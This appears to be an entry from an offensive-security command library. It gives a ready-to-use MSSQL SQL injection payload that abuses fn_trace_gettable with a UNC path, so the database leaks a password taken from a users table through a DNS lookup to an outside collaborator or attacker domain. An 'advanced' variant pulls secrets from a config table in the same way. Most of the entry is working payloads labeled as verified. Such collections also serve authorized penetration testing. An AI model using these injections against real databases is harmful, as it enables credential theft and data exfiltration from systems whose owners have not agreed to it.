---
id: cb93cf5a-ecad-4bad-a336-88f7b1f0298c
name: mssql-check-fn-trace-gettable-access
type: command
executor: sql
data: >-
  1 and exists(select * from fn_trace_gettable('\\' + (select pass from users
  where id=1) + '.xxxx.burpcollaborator.net\1.trc',default))
output: null
created_at: '2023-04-06T03:56:34.004353+00:00'
updated_at: '2023-04-10T20:22:40.529149+00:00'
platforms:
  - Windows
  - Database
tags:
  - mssql
  - dns-exfiltration
  - sql-injection
verified: true
validated: true
---

# mssql-check-fn-trace-gettable-access

## Command

```sql
1 and exists(select * from fn_trace_gettable('\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\1.trc',default))
```

## Description

This SQL command verifies access to the fn_trace_gettable function, which requires CONTROL SERVER permission. It constructs a UNC path for trace files that triggers a DNS query with embedded sensitive data for exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `users` | Table name for data source | Yes |
| `pass` | Column to exfiltrate | Yes |
| `id=1` | Specific row identifier | Yes |
| `xxxx.burpcollaborator.net` | DNS collaborator domain | Yes |
| `1.trc` | Target trace file extension | Built-in |
| `default` | Default filter for traces | Built-in |

## Examples

### Basic Usage

```sql
1 and exists(select * from fn_trace_gettable('\\' + (select pass from users where id=1) + '.attacker-dns.net\1.trc',default))
```

### Advanced Usage

For different data: ```sql
1 and exists(select * from fn_trace_gettable('\\' + (select secret from config where id=1) + '.attacker-dns.net\1.trc',default))
```

## Expected Output

Returns 1 on success with a DNS query to the subdomain (e.g., password.attacker-dns.net); otherwise, 0 or error with no DNS activity.

## Related

- [[procedures/mssql-out-of-band-dns-exfiltration]]
- [[commands/mssql-check-fn-get-audit-file-access]]
